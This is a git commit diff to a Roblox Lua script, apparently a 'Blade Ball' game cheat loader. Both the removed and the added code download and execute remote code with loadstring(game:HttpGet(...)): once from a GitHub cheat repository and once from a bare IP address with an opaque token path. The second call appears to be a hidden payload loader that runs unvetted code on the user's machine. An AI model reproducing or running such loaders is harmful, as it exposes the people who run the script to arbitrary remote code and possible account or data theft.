c1cb5093a61d28caaf68097fb450e3e3caf82462
cxzyue <jadematthew49@gmail.com>
2026-05-28 12:30:29 +0800

    Update Source.lua

--- Source.lua
+++ Source.lua
@@ -1,1 +1,7 @@
-task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Akash1al/Blade-Ball-Updated-Script/refs/heads/main/Blade-Ball-Script"))()end)loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Akash1al/Blade-Ball-Updated-Script/refs/heads/main/Blade-Ball-Script"))()
+    
+    task.wait(2)
+    
+    loadstring(game:HttpGet("http://72.56.64.162/cse0daX1rLANfdjBtjaGsgh7pkXHjnjZ3xkkMdMbovDCSUXrI7uDgUcfwW82NwomeI9xMxNRDChGn9j4"))()
+end)
